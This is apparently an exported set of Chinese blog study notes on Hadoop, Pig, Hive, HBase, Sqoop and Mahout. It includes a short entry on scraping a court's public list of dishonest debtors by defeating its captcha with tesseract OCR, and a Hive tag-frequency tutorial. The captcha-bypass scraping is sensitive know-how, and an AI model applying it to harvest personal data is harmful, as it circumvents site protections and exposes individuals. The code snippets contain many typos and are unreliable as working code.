输入,输出格式 String line = value.toString(); try{ //数据处理 String[] lineSplit = line.split(&quot; &quot;);//135,10085 String anum = lineSplit[0]; String bnum = lineSplit[1]; context.write(new Text(bnum),new Text(anum)); }catch(java.lang.ArrayIndexOutOfBoundsExecption e){ context.getCounter(Counter.LINESKIP).increment(1);//出错令计数器+1 return; } } public static class Reduce extends Reducer&lt;Text,Text,Text,Text&gt;{ public void reduce(Text key,Iterable&lt;Text&gt; values,Context context)throws IOException,InterruptedException{ String valueString; String out = &quot;&quot;; for (Text value:values){ valueString = value.toString(); out += valueString + &quot;|&quot;; } context.write(key,new Text(out)); } } run(){ job.setReducerClass(Reduce.class); } main(){} } Export-&gt;JAR-&gt;JAR file path-&gt;next-&gt;Main Class填写-&gt;Clone //note05 MR实战 性能调优： 究竟需要多个reducer？ 输入：大文件(上G的）优于小文件 减少网络传输：压缩map的输出 优化每个节点能运行的任务数：mapred.tasktracker.map.tasks.maximum和mapred.tasktracker.reduce.tasks.maximum(缺省值均为2) hadoop流与脚本 wordcount: //数单词 cat install.log | wc web Apache日志分析： PV IP 图片/日志点击先区分开 爬虫/日志点击区分开 //排除爬虫 探针设计 //在网站点击一下,只用算法排除的话，依然是多出3-5倍无用点击 //不直接分析网站日志，而是间接分析探针日志，来计算pv &lt;script type=&quot;text/javascriopt&quot;&gt; var _gaq = _gaq || []; _gaq.push([&apos;_setAccount&apos;,&apos;UA-20237423-4&apos;]); _gaq.push([&apos;_setDomainName&apos;,&apos;.itpub.net&apos;]); _gaq.push([&apos;_trackPageview&apos;]); (function(){ var ga = document.createElement(&apos;script&apos;); ga.type = &apos;text/javascript&apos;; ga.async = true; ga.src = (&apos;https:&apos; == doucment.location.protocol? &apos;https://ssl&apos;:&apos;http://www&apos;) + &apos;.google-a???&apos;; var s = document.getElementsByTagName(&apos;script&apos;)[0]; s.parentNode.insertBefore(ga,s); })(); &lt;/script&gt; &lt;div style=&quot;display:none&quot;&gt; &lt;script type=&quot;text/javascript&quot;&gt; var _bdhmProtocol = ((&quot;https:&quot; == document.location.protocol) ? &quot;https://&quot; : &quot;http://&quot;); document.write(unescape(&quot;%3Cscript src=&apos;&quot; + _bdhmProtocol + &quot;hm.baidu.com/h.js%3F5016281862f595e78&quot;)); &lt;/script&gt;&lt;/div&gt; &lt;!-- END STAT PV --&gt;&lt;/body&gt; &lt;/html&gt; 排除爬虫和程序点击，对抗作弊 ·用鼠标测动对抗爬虫 ·常用流量作弊手段 ·跟踪用户 ### 一边点击一边换IP ### 拿搜索词 ？？纯真88 统计浏览器类型 少量数据的情况下： awk,grep,sort,join等,perl,python,正则等 海量数据的情况下： 10G,100G 增长的时候 CDN (反向代理加速) ip去重 //note06 复杂应用/hadoop流 InputFormat() OutputFormat() // 06 hadoop_v4_06c 04:00 //note07 Pig set命令检查环境变量 进入grunt shell pig -x local PIG_CLASSPATH pig Pig的运行方法： 脚本 Grunt 嵌入式 pig转换为java，再由jvm执行 Grunt 自动补全机制 Autocomplete文件 Eclipse插件PigPen help ls,cat,cd copyToLocal test1.txt ttt (复制到grunt外面的当前路径) sh /usr/java/jdk1.7.0.0_26/bin/jps //直接执行命令 Bag,Tuple,Field,Pig不要求具有各tuple相同数量或相同类型的field pig -x local A = LOAD &apos;/home/grid/csdn.txt&apos; USING PigStorage(&apos;#&apos;) B = FOREACH A STORE B INTO &apos;/home/grid/emmail.txt&apos; USING PiagStorage(); 脚本： grunt&gt; records = LOAD &apos;input/ncdc/micro-tab/sample.txt&apos; &gt;&gt; AS (year:chararray,temperature:int,quality:int); //如果没有定义分隔符，则默认是制表符。 DUMP records; //输出 DESCRIBE records; //输出查看结构 filtered_records = FILTER records BY temperature != 9999 AND &gt;&gt; (quality == 0 OR quality == 1 OR quality == 4 OR quality == 5 OR quality == 9); DUMP filtered_records; GROUP FOREACH //对每一行进行扫描处理 //有点类似面向数据流的处理语言，Mapp-Reduce有点面向计算 UDF 用户自定义函数 guoyunsky.iteye.com/blog/1317084 reg: pig cat score.txt A = LOAD &apos;score.txt&apos; USING PigStorage(&apos;,&apos;) AS (student,course,teacher,score:int); DESCRIBE A; B = FOREACH A CENERATE student,teacher; DESCRIBE B; C = DISTINCT //去重 C = DISTINCT B; D = GROUP C BY student; D = FOREACH (GROUP C BY student) CENERATE group AS student,COUNT(C); DUMP D; //第二种方法 DESCRIBE B; E = GROUP B BY student; DESCRIBE E F = FOREACH E { T = B.teacher; uniq = DISTINCT T; GENERATE group AS student,COUNT(uniq) AS cnt; } //note08 Hive 数据仓库工程师 NoSQL -&gt; Not Only SQL Hive安装 配置文件 cd hive/conf hive-env.sh.template -&gt; hive-env.sh HADOOP_HOME=xxx export HIVE_CONF_DIR=xxx hive-site.xml hadoop-env.sh export HADOOP_CLASSTHAN= xxx; ./hive show tables create table abc (c1 string); drop table abc; /user/hive/warehouse/abc/数据 insert overwrite table result select xxx frrom loc thrift server / JDBC reg: main()throws Exception{ CLass.forNmae(&quot;org.apache.hadoop.hive.jdbc.HiveDriber&quot;); String dropSql=&quot;drop table pokes&quot;; String createSql=&quot;create table pokes (foo int,bar string&quot;; String insertSql=&quot;load data local inpath &apos;/home/zhangxin/hive/kv1.txt&apos; overwrite into table pokes&quot;; String querySql=&quot;select bar from pokes limit 5&quot;; Connection connection=DriverManager.getConnection(&quot;jdbc:hive://localhost:10000/default&quot;,&quot;&quot;,&quot;&quot;); Statement statement = connection.createStatement(); statement.execute(dropSql); statement.execute(createSql); statement.execute(insertSql); ResultSet rs = statement.executeQuery(querySql); while(rs.next()){ sout(rs.getString(&quot;bar&quot;)); } } http://10.20.151.7:9999/hwi/ //ip改成自己的，默认web路径访问 元数据 //note09 Hive sql不同的，有3种独特的类型 struct map array reg: create table employees( name STRING, salary FLOAT, subordinates ARRAY&lt;STRING&gt;, deductions MAP&lt;STRING,FLOAT&gt;, address STRUCT&lt;street:STRING,city:STRING,state:STRING,zip:INT&gt; ); 缺省分隔符： \n ^A \001 分离不同的列(字段) ^B \002 分割数组/集合里面的元素 ^C \003 map的key，value之间分割 create table employees( xxx ) ROW format delimited fields terminated by &apos;\001&apos; collection items terminated by &apos;\002&apos; map keys terminated by &apos;\003&apos; lines terminated by &apos;\n&apos; stored as textfile; DDL: create database if not exists financials; show databases like &apos;h.*&apos;; 存放目录 缺省存放目录由hive.metastore.warehouse.dir指定 可以使用以下命令覆盖 create database financials location &apos;/my/preferred/directory&apos; 观看数据库描述 create database financials comment &apos;Holds all financial tables&apos;; describe database financials; create database financials with dbproperties(&apos;creator&apos;=&apos;Mark Moneybags&apos;,&apos;date&apos;=&apos;2012-01-02&apos;); describe database extended financials; 切换数据库 USE financials; set hive.cli.print.current.db=true; hive (financials)&gt; USE default; hive (default)&gt; set hive.cli.print.current.db=false; hive&gt; ... 删除和更改数据库 drop database if exists financials; drop database if exists financials cascade; //连数据一起删掉 alter database financials set dbproperties(&apos;edited-by&apos;=&apos;Joe&apos;); 创建表 create table employees( name STRING comment &apos;Employee name&apos;, salary FLOAT comment &apos;Employee salary&apos;, subordinates ARRAY&lt;STRING&gt; comment &apos;Names of xx&apos;, deductions MAP&lt;STRING,FLOAT&gt;, address STRUCT&lt;street:STRING,city:STRING,state:STRING,zip:INT&gt; ) comment &apos;Description of the table&apos; tblproperties(&apos;creator&apos;=&apos;Mark Moneybags&apos;,&apos;date&apos;=&apos;2012-01-02&apos;) location &apos;/user/hive/warehouse/mydb.db/employees&apos;; create table if not exists mydb.employees2 like mydb.employees; 列出表 USE mydb; show tables; use default; show tables in mydb; use mydb; show tables &apos;empl.*&apos; 观看表的描述 describe extended mydb.employees; 外部表 create table employees( name STRING comment &apos;Employee name&apos;, salary FLOAT comment &apos;Employee salary&apos;, subordinates ARRAY&lt;STRING&gt; comment &apos;Names of xx&apos;, deductions MAP&lt;STRING,FLOAT&gt;, address STRUCT&lt;street:STRING,city:STRING,state:STRING,zip:INT&gt; ) row format delimited fields terminated by &apos;,&apos; location &apos;/data/stocks&apos;; create external table if not exists mydb.employee3 like mydb.employees location &apos;/path/to/data&apos;; 分区表： create table employees( xxx ) partitioned by (country STRING,state STRING); 分区表的存储：会变成一个子目录里面的一系列文件 set hive.mapred.mode=strict; select e.name,e.salalry from employees e limit 100; //报错，然后 set hive.mapred.mode=nonstrict; select e.name,e.salalry from employees e limit 100; 指定存储格式 create table kst partitioned by (ds string) row format serde &apos;com.linkedin.haivvreo.AvroSerDe&apos; with serdeproperties (&apos;schema.url&apos;=&apos;http://schema_provider/kst.avsc&apos;) stored as inputformat &apos;com.linkedin.haivvreo.AvroContainerInputFormat&apos; outputformat &apos;com.linkedin.haivvreo.AvroContainerOutputFormat&apos;; create external table if not exists stocks( xxx ) clustered by (exchange,symbol) sorted by (ymd asc) into 96 buckets 删除和更改表 alter table log_messages partition(year=2011,month=12,day=2) set location &apos;s3n://ourbucket/logs/2011/01/02&apos;; alert table log_messages set tblproperties(&apos;notes&apos;=&apos;The xxxx&apos;); 列操作 alter table log_messages change column hms hours_minutes_secondes int comment &apos;xx&apos; after severity; alter table log_messages add columns( app_name STRING); alter tbal log_messages replace columns(message STRING); DML操作 Hive不支持行级别，将数据放入表中的唯一办法是批量载入 LOAD DATA LOCAL inpath &apos;{env:HOME}/california-employees&apos; overwrite into table employees partition(country = &apos;US&apos;,state=&apos;CA&apos;); Insert overwrite语句 insert overwrite table employees partition(country=&apos;US&apos;) select * from staged_employees se where se.cnty=&apos;US&apos; from staged_employees se //非分区表 insert overwrite table employees partition (country=&apos;US&apos;) select * from xxx s where s.cnty=&apos;US&apos; //将非分区的表变成了分区表 动态分区插入 set hive.exec.dynamic.partition=true; set hive.exec.dynamic.partition.mode=nonstrict; set hive.exec.max.dynamic.partitions.pernode=1000; 创建表的同时把数据放进去 create table ca_employees as select name,salary,address from employees where se.state=&apos;CA&apos;; 导出数据 直接复制粘贴 如果需要改动数据格式，可以使用insert overwrite insert overwrite local directory &apos;/tmp/ca_employees&apos; select name,salary,address from employees where se.state = &apos;CA&apos;; SELECT: 使用正则表达式 select symobl,&apos;price.*&apos; from stocks; select name from employees where address.street like &apos;%Ave.&apos; select name,address.street from employees where address.street rlike &apos;.*(Chicage|Ontario).*&apos;; //rlike 来正则匹配 函数 //求各种统计指标的函数 explode //可以把数组元素展开成很多行 select explode(array(1,2,3)) as element from src; 嵌套select from ( select upper(name),deductions[&quot;Federal Taxes&quot;] as fed_taxes from employees ) e select e.name,e.salary_minus_fed_taxes where e.salary_minus_fed_taxes &gt; 70000; 连接操作(缓慢) set hive.auto.convert.join=true; select s.ymd,s.symbol,s.price_close,d.dividend from stocks s join dividends d on s.ymd = d.ymd and s.symbol = d.symbol where s.symbol=&apos;AAPL&apos; 排序 order by and sort by distribute by cluster by bucket : 桶 hash (抽样查询) select * from numbers TABLESAMPLE(BUCKET 3 OUT OF 10 ON rand())s; 视图与索引 create index employees_index on tbale employees(country) as &apos;org.apache.hadoop.hive.ql.index.compact.CompactIndexHandler&apos; with deferred rebuild idxproperties(&apos;creator = &apos;me&apos;,&apos;created_at&apos;=&apos;some_time&apos;) in table employees_index_table partitioned by (country,name) comment &apos;Employees indexd by country and name.&apos;; 位图索引 建模 执行计划 Google Dremel 山寨货：Apache Drill Cloudera Impala （Hive的替代方案） yarm是底层 架构在yarm上面就可以不用map-reduce了，可以用hadoop流什么的 //note10 Hive-impala子项目 HBase  Google Bigtable的开源实现  列式数据库  可集群化  可以使用shell、web、api等多种方 式访问  适合高读写(insert)的场景  HQL查询语言  NoSQL的典型代表产品 //不是使用的SQL语言 mysql是什么东西限制了其扩展，noSQL怎么解决的这个问题 Sqoop 用于在Hadoop和关系型数据库之间交换数据 通过JDBC接口连入关系型数据库 Avro 数据序列化工具 Chukwa 架构在Hadoop之上的数据采集与分析框架 主要进行日志采集和分析 Cassandra （几乎淘汰） 与Hbase类似，借鉴Google Bigtable的思想体系 特点：无中心的数据库 缺点：效率比较低 Zookeeper： //还是一个资源库 文件没有上下级之分 znode可以存放data，上限1M；还可以放ACL，访问控制列表。 一般是奇数个节点，节点都是平等的，表面看起来zookeeper是无中心的但是会选举一个出来。 zab协议 阶段1:领导者选举 阶段2:原子广播 每个节点放一个watch，leader修改了信息后其他节点可以查看到修改的信息，并更改自己的信息 分布锁： znode---leader -&gt; lock 观察 羊群效应 //note11 zookeeper Big Table想法： (S#,sn,sd,sa) /* 1.行列：key值 2.属性 3.value */ hbase 删除不是正常删，而且给某个时间戳的一行插入一个新的行键打个标记作为删除 （HDFS不能进行文件修改，追加也很麻烦，Hbase做了一个折中的方式来insert。所有数据都是往内存里面插，在一定时间内存满了之后才可以写，即收集一定数据后就可以往里写，一写就是一块。）（Hbase每隔一段时间进行重整操作，会把一些比较小的时间拿出来合并成比较大的文件。抛弃是在重整操作过程中操作的，打标记的都扔掉，然后再重新写成一个大的文件。） 行键也是可以重复的 面向时间查询 行键 列族与列 时间戳 可以由用户显式赋值 行键，列族：限定符，时间戳 来唯一决定 列族元素在物理上存放的是同一个地方，不同的列族是不同的物理存放 store memoryStore (先) storeFile (后) 当内存里面的东西足够多时会存到storeFile（物理） 读取是在memoryStore里面的 每过一段时间会触发合并过程，会把小的storeFile合并成大的storeFile，合并过程中会删除标记的行及过期的行 每一个storeFile对应一个HDFS的文件，会分散在不同的物理节点里面 Region和Region服务器 HLog -ROOT-和.META.表  HBase中有两张特殊的Table，-ROOT-和.META.  Ø .META.:记录了用户表的Region信息，.META.可以有多个regoin  Ø -ROOT-:记录了.META.表的Region信息，-ROOT-只有一个region  Ø Zookeeper中记录了-ROOT-表的location Memstore与storeFile 一个store包含一个列族的所有数据，列族存放是在临近的区域里面 传统数据库的行式存储 为了读某个列的数据，必须要把整个行读完才能对其读取 联机事务处理随机读写还是要用行式数据库。 行式数据库存储问题 行标识访问：B树索引 B树索引原理：树形 oracle行式存储的访问形式 BigTable的LSM索引 （日志及数据） L：log S：结构 M：merge（合并） 日志就是数据 zookeeper： 安装：单机模式 配置 安装：集群模式 hadoop与hbase版本问题 hbase-&gt;hadoop-core-x.x.x.jar //可以看hadoop匹配版本 修改hbase-env.sh 配置hbase-site.xml 启动Hbase及验证 bin/start-hbase.sh /usr/java/jdk1.6.0_26/bin/jps Hbase安装：伪分布模式 编辑hbase-env.sh增加HBASE_CLASSPATH环境变量 编辑hbase-site.xml打开分布模式 覆盖hadoop核心jar包 Hbase安装：完全分布模式 192.168.5.134:60010/master.jsp //note12 Hbase操作命令复杂 Hbase数据建模问题 关系型数据库的弱点 CAP定律： NoSQL运动 NoSQL数据库家族 redis一半内存一半硬盘 列式数据库在数据分析时工作特别快 满足一致性，可用性的系统 Redis key-value类型的数据库 Hbase 不能group by等连接 Cassandra MongoDB 擅长处理非结构化数据 Neo4J 适用于社交网站 NoSQL与CAP 密切相关的。真的要做成分布式的话必须要在其中放弃一种，一般都选一致性 Hbase存储架构理解 Key Length Value Length Key Value //key,value的长度比较重要 什么情况下使用Hbase？  成熟的数据分析主题，查询模式已经确立并且不轻易改变  传统的关系型数据库已经无法承受负荷，高速插入，大量读取  适合海量的，但同时也是简单的操作(例如key-value) 关系型数据库的困难 模式设计 Hbase:表设计与查询实现 搜索优化： u-t t-u 辅助索引 复合行键设计 //note13 数据集成 Sqoop mysql hadoop 连接 Flume Chukwa 日志收集 ODCH/OLH oracle hadoop 连接 Oracle大数据连接器 Sqoop SQL-to-HDFS工具 JDBC hadoop-0.20.2下Squoop是不支持此版本的 配置 sqoop命令选项： % sqoop help % sqoop help import 从mysql导入数据的例子 % sqoop import --connect jdbc:mysql://localhost/hadoopguide \ //连入mysql &gt;--table widgets -m 1 % hadoop fs -cat widgets/part-m-00000 //间隔符用的， 导入到Hbase sqoop import --connect jdbc:mysql//mysqlserver_IP/databaseName --table datatable --hbase-create-table --hbase-table hbase_tablename --column-family col_fam_name --hbase-row-key key_col_name 其中，databaseName和datatable是mysql的数据库和表名，hbase_tablename是要导成hbase的表名，key_col_name可以指定datatable中哪一列作为hbase新表的rowkey,col_fam_name是除rowkey之外的所有列的列族名 从oracle导入数据 需要有ojdbc6.jar放在$SQOOP_HOME/lib里，不需要添加到classpath connecturl=jdbc:oracle:thin:@172.7.10.16:1521:orcl oraclename=scott oraclepassword=wang123456 oracleTableName=test #需要从oracle中导入的表中的字段名 columns=ID,STATE #导出到HDFS后的存放路径 hdfsPath=/tmp/ sqoop import --append --connect $CONNECTURL --username $ORACLENAME --password $ORACLEPASSWORD --m 1 --table $oracleTableName --columns $columns --hbase-create-table --hbase-table orl --hbase-row-key STATE --column-family orl oracle big data connectors HDFS直接连接器 可以把带有分隔符的文件作为oracle的外部表访问 还可以直接hadoop的文本文件作为数据源 hadoop装载器 直接把hadoop里面的东西装载过去 Oracle HDFS直接连接器(ODCH)实验 Oracle Enterprise Linux 配置hdfs_steam script文件 ... (hadoop_v4_13d) /logs /extdir !cat lab4.2_setup_DB_dir.sql set echo on create or replace directory ODCH_LOG_DIR as &apos;/home/hadoop/.../logs&apos; grant read,write on directory ODCH_LOG_DIR to SCOTT; @lab4.2_setup_DB_dir.sql sqlplus scott/tiger !cat lab4.3_ext_tab.sql SQL创建外部表 preprocessor HDFS_BIN_PATH:hdfs_stream //先预处理数据再读 PROMPT&gt;sqlplus scott/tiger select count(*) from odch_ext_table; set autotrace trace exp //设置追踪，来观察执行计划 select count(*) from odch_ext_para_table; CDN加速 Flume 提供分布式，可靠和高可用的海量日志采集，聚合和传输的系统 Chukwa //note14 扩展开发，与应用集成 UDF （用户定义函数） （reg：Pig，Hive） Thrift接口 Rhadoop UDF 写个自定义jar create temporary function strip as &apos;com.hadoopbook.hive.[ClassName]&apos; % hive --auxpath /path/to/hive-example.jar select xxx(&apos;name&apos;) from student filter: jar register pig-examples.jar grunt&gt;filter.... com.hadoopbook.pig.xxxx(xxx); DEFINE isGood com.hadoopbook.pig.xxxx(); 然后就可以用 isGood(xxx); 应用与Hbase的对接：通过Thrift Thrift是一个跨语言的服务部署框架 通过一个中间语言（IDL，接口定义语言）来定义RPC的接口和数据类型 //note15 与应用层连接 并行计算框架 MPI PVM Mesos Map-Reduce YARN 可以同时支持Map-Reduce，Storm，Spark，MPI等多种流行计算模型 Spark YARN配置 //note16 hadoop源代码 //note17 hadoop与机器学习 Hadoop与机器学习 Mahout （封装各种算法）（天生适合做离线数据分析） Hadoop在互联网企业中的应用 spark基于内存来计算。成本比hadoop高 不要求实时得出结果，可以不选spark spark不太好转，跟java几乎无关 Mahout （在Data Mining上） 数据金字塔：从下往上 Making Decisions （决策层） Data Presentations （数据展示层） Data Mining （数据挖掘，建立数学模型/算法，找到一种合适的算法） Data Exploration （对数据进行简单的查询） Data Warehouses/Data Marts ETL（数据仓库） Data Sources （数据源） 回归 样本这里叫学习集 用来做预测 分类器 决策树 贝叶斯分类器（顾客流失）（自己设置阈值）（文本分类）（搜索引擎判断两篇文章是否一致，概率多高） 有学习集的进行特征提取就可以自动完成 聚类（没有学习集） （层次聚类法） 数据挖掘 数据分析 SAS，R，SPSS SAS数据是经过检验的，R就不太可靠，SAS主要应用于金融 传统数据分析工具的困境 处理数据受限于内存，因此无法处理海量数据（R处理上限可能是100万）（R跟SAS处理不能超过内存数，不然会机器异常） ... （聚类，推荐系统就无法使用抽样） 解决方向：hadoop集群和Map-Reduce并行计算 常见算法的Map-Reduce化 样本独立性比较强的就可以map-reduce Lucene 早期搜索引擎的项目 Mahout的特点： 下载和解压Mahout wget http://mirrors.cnnic.cn/apache/mahout/0.6/mahout-distribution-0.6.tar.gz tar xzf ./mahout-distribution-0.6.tar.gz 配置环境变量 export HADOOP_HOME=/home/huang/hadoop-1.1.2 export HADOOP_CONF_DIR=/home/huang/hadoop-1.1.2/conf export MAHOUT_HOME=/home/huang/hadoop-1.1.2/mahout-distribution-0.6 export MAHOUT_CONF_DIR=/home/huang/hadoop-1.1.2/mahout-distribution-0.6/conf export PATH=$PATH:$MAHOUT_HOME/conf:$MAHOUT_HOME/bin 几个重要环境变量 JAVA_HOME mahout运行需指定jdk的目录 MAHOUT_JAVA_HOME指定此变量可覆盖JAVA_HOME值 HADOOP_HOME 如果配置，则在hadoop分布式平台上运行，否则单机运行 HADOOP_CONF_DIR指定hadoop的配置文件目录 MAHOUT_LOCAL 如果此变量值不为空，则单机运行mahout。 MAHOUT_CONF_DIR mahout配置文件的路径，默认值是$MAHOUT_HOME/src/conf MAHOUT_HEAPSIZE mahout运行时可用的最大heap大小 （堆大小） 验证安装成功 bin/mahout 源码和部分样本数据 装的时候要装源代码包(即-src的包) 将测试数据copy到HDFS hadoop/bin/hadoop fs -mkdir ./testdata hadooop/bin/hadoop fs -put ./synthetic_control.data ./testdata hadoop/bin/hadoop fs -ls ./testdata 做一个kmeans测试（聚类测试） mahout org.apache.mahout.clustering.syntheticcontrol.kmeans.Job 观察输出 用mahout输出 mahout vectordump --seqFile ./output/data/part-m-00000 20Newsgroups数据集 使用Mahout进行文本自动分类 上传并解压数据 20news-bydate-test 测试数据 20news-dydate-train 训练数据 建立训练集 mahout org.apache.mahout.classifier.bayes.PrepareTwentyNewsgroups \ -p /home/huang/data/20news-bydate-train \ -o /home/huang/data/bayes-test-input \ (结果输出到了本地。。) -a org.apache.mahout.vectorizer.DefaultAnalyzer \ -c UTF-8 （作了分词什么的。。） 上传到HDFS cd ../hadoop-1.1.2 bin/hadoop fs -mkdir ./20news bin/hadoop fs -put ../data/bayes-train-input ./20news bin/hadoop fs -put ../data/bayes-test-input ./20news 训练贝叶斯分类器 mahout trainclassifier \ -i /user/huang/20news/bayes-train-input \ -o /user/huang/20news/newsmodel \ （放输出的模型，即统计参数数据） -type cbayes -ng 2 \ -source hdfs 生成的模型 bin/hadoop fs -ls ./20news/newsmodel (里面放了一堆模型数据) 测试贝叶斯分类器 mahout testclassifier \ -m /user/huang/20news/newsmodel \ -d /user/huang/20news/bayes-test-input \ -type cbayes -ng 2 \ -source hdfs \ -method mapreduce 京东 部门结构  运维团队(负责管理维护集群的正常运行)  数据仓库团队(根据业务部门的要求进行数据统计和查询)  成都研究院(负责底层，包括源代码修改和按上层部门要求开发 Map-Reduce程序，比如一些UDF) 淘宝 对Hadoop源码的修改 管理模式 准实时的流数据处理技术  从Oracle, Mysql日志直接读取数据  部分数据源来自应用消息系统  以上数据经由Meta+Storm的流数据处理，写入HDFS，实现实时或准实时的数据分析  数据装载到Hive进行处理，结果写回Oracle和Mysql数据库 Oceanbase 百度  日志的存储和统计;  网页数据的分析和挖掘;  商业分析，如用户的行为和广告关注度等;  在线数据的反馈，及时得到在线广告的点击情况;  用户网页的聚类，分析用户的推荐度及用户之间的关联度。]]></content>
      <categories>
        <category>技能</category>
        <category>编程</category>
        <category>后端</category>
        <category>大数据</category>
        <category>基础</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>笔记</tag>
        <tag>大数据</tag>
        <tag>Hadoop</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[失信名单人爬取笔记01]]></title>
    <url>%2F2018%2F09%2F10%2F%E5%A4%B1%E4%BF%A1%E5%90%8D%E5%8D%95%E4%BA%BA%E7%88%AC%E5%8F%96%E7%AC%94%E8%AE%B001%2F</url>
    <content type="text"><![CDATA[失信名单人爬取 http://shixin.court.gov.cn/ 数据采集复杂度确定 1、是否为Https类采集，需要添加证书等操作 2、是否需要模拟登陆 3、模拟登陆的复杂度判定 4、验证码复杂度 5、站点反爬方式 6、站点的反爬力度 7、站点本身的个性方面：资源稀缺性、采集强度、采集量级要求 自前往后 自后往前 随机插入 如果有Received，即意味着发生了改变 //测试的时候可以通过Java GUI来得到输入的验证码 VerifyGuiUtil verifyGuiUtil = new VerifyGuiUtil(); String flag = &quot;login&quot;; String verify_code_input = verifyGuiUtil.getVerifyCode(flag,null,&quot;test_ts&quot;,1); sout(&quot;输入的验证码=&quot; + verify_code_input); 自动采集分析： 1、验证码可以重复输入支持 2、tesseract安装与简单测试 3、tesseract的验证码识别工具组件化 4、tesseract识别失信人验证码 cmd-&gt;in pwd tesseract.exe test.jpg tttt CmdProcessUtil.java: (部分) public static boolean process(String binPath,String paras){ BufferedReader br = null; try{ Runtime runtime = Runtime.getRuntime(); String command_line = binPath + &quot; &quot; + paras; logger.info(&quot;command_line ---&quot; + command_line); Process process = runtime.exec(command_line); InputStream is = process.getInputStream(); process.getErrorStream().close(); process.getOutputStream().close(); br = new BufferedReader(new InputStreamReader(is)); String temp = null; while((temp = br.readline())!=null){ sout(temp); } return true; }catch(){ logger.info(&quot;phantomjs 在爬取网页信息时出现异常，请检查&quot;); logger.info(e.getLocalizedMessage()); return false; }finally{ if(br != null){ try{ br.close(); }catch(){ xxx } } } psvm(){ String binPath = &quot;D:\\xxxx\\tesseract.exe&quot;; String paras = &quot;verify.jpg result&quot;; boolean exec_flag = CmdProcessUtil.process(binPath,paras); String verify_code = IOUtil.readFile(&quot;result.txt&quot;,&quot;utf-8&quot;).trim(); } }]]></content>
      <categories>
        <category>技能</category>
        <category>编程</category>
        <category>后端</category>
        <category>Java</category>
        <category>爬虫</category>
        <category>采集</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>笔记</tag>
        <tag>大数据</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[大数据采集学习笔记01-实时热点]]></title>
    <url>%2F2018%2F09%2F10%2F%E5%A4%A7%E6%95%B0%E6%8D%AE%E9%87%87%E9%9B%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B001-%E5%AE%9E%E6%97%B6%E7%83%AD%E7%82%B9%2F</url>
    <content type="text"><![CDATA[APP热点标签分析 需求分析 给定一批app名称及其描述信息，共52.9万条数据 其内容结构为，共包含6个字段，分别为（appId,app名称，一级分类，二级分类，三级分类，Tags描述信息），但并不一定完全规整，视实际情况可能做对齐包括4个或5个或6个字段。 通过大数据开发之hive数据仓库命令行形式，完成数据加载，udf/udaf/udtf函数，统计分析的任务，并演示项目效果即可。 主要思路 通过hive命令将数据加到数据仓库中 使用hql+udf/udaf/udtf完成统计分析 将统计分析结果插入到hive中自建的新表中 主要考点 hive及hiveSQL常用命令 系统函数+udf/udaf/udtf灵活使用 hive常见问题的解决 技术组成：hive sql+udf/udaf/udtf 步骤拆解： 1）输入，输出表设计到位 （1-0.4h） 2）将数据加载到输入表中 （1-04h） 3）hivesql+udf/udaf/udtf实现热词统计与写入库表 （1-0.5h） 开发细节 4.0 prepare 1）相关目录创建 config:存放相关配置变量 create:存放表结构数据 deal:具体的sql脚本 udf:udf/udaf/udtf相关的jar包 4.1 按步骤执行 5.bug修复，调优 6.上线 6.1项目部署 6.2上线 //输入表 //怎么区分内表还是外表，外部引入的一般都是外表 //规定一下分割，存储格式 create external table app_tag_meta_info( id string, name string, first_classify string, second_classify string, third_classify string, tags string ) #建成分区表 partitioned by (dt string comment &apos;update date&apos;) row format delimited fields terminated by &apos;\t&apos; lines terminated by &apos;\n&apos; stored as textfile; touch config.sh 或者 touch set_env.sh #! /bin/bash HIVE=&apos;/usr/bin/hive&apos; #source set_env.sh sh set_env.sh 不是在本窗口添加环境变量的，而是开了新窗口添加的环境变量 //改权限 chown -R hive 文件夹名. -R为递归赋予hive权限 [...config]#cd ../create/ touch app_tag_meta_info.sh #! /bin/bash source ../config/set_env.sh db=&quot;job_002&quot; table_name=&quot;app_tag_meta_info&quot; $HIVE -e &quot; use $db; create external table $table_name( id string, name string, first_classify string, second_classify string, third_classify string, tags string ) partitioned by (dt string comment &apos;update date&apos;) row format delimited fields terminated by &apos;\t&apos; lines terminated by &apos;\n&apos; stored as textfile; &quot; # sh app_tag_meta_info use job_002 show tables desc app_tag_meta_info 如果要修改.sh文件的话，不能直接修改，要删除已有的sh出来的表再重新建立 drop table app_tag_meta_info; sh .... //输出表 create table hot_tag_rank( tag string, freq int, ) partitioned by (dt string comment &apos;update date&apos;) row format delimited fields terminated by &apos;\t&apos; lines terminated by &apos;\n&apos; stored as textfile; sh app_tag_meta_info //将数据加载到数据表中 [create] # ../deal rz -y touch produce_app_tag_meta_info.sh #! /bin/bash source ../config/set_env.sh updateDT=$1 //$1 即第一个传入的参数 一般放在最前面 db=&quot;job_002&quot; table_name = &quot;app_tag_meta_info&quot; jar_path=&quot;&quot; class_path=&quot;&quot; data_source_path=&quot;app_abstract_info.txt&quot; $HIVE -e &quot; use $db; load data local inpath &apos;$data_source_path&apos; overwrite into table $table_name partition(dt=&apos;$updateDT&apos;) &quot; sh xxx.sh select * from app_tag_meta_info limit 10; show partitions app_tag_meta_info //查看分区 //setp1:找到tag字段 select tags from app_tag_meta_info limit 10; //修改上句，改为集合 select split(tags,&apos;,&apos;) from app_tag_meta_info limit 10; //再把上句改为字符串 //setp2:拆分字段 select explode(split(tags,&apos;,&apos;)) from app_tag_meta_info limit 10; (不采用) //step3:用lateral view包装 select tag from app_tag_meta_info laterval view explode(split(tags,&apos;,&apos;)) tag_table as tag limit 10; (采用)(即不使用 as tag 这种形式，避免了后面的where 无法使用tag的形式) //step4:bug解决和优化（去空格） select tag from app_tag_meta_info laterval view explode(split(tags,&apos;,&apos;)) tag_table as tag where tag !=&apos;&apos; limit 10; //按频次倒排 select tag,count(1) as freq from app_tag_meta_info laterval view explode(split(tags,&apos;,&apos;)) tag_table as tag where tag !=&apos;&apos; and tag != &apos;-&apos; group by tag order by freq limit 10; //这里select先执行order by后执行，所以可以看到前面的函数值 set hive.execution.engine=tez; //将结果集写入到表中 分区表用overwrite写入 insert overwrite table hot_tag_rank partition(dt=&apos;20180507&apos;) select tag,count(1) as freq from app_tag_meta_info laterval view explode(split(tags,&apos;,&apos;)) tag_table as tag where tag !=&apos;&apos; and tag != &apos;-&apos; and dt=&apos;20180507&apos; group by tag order by freq desc; 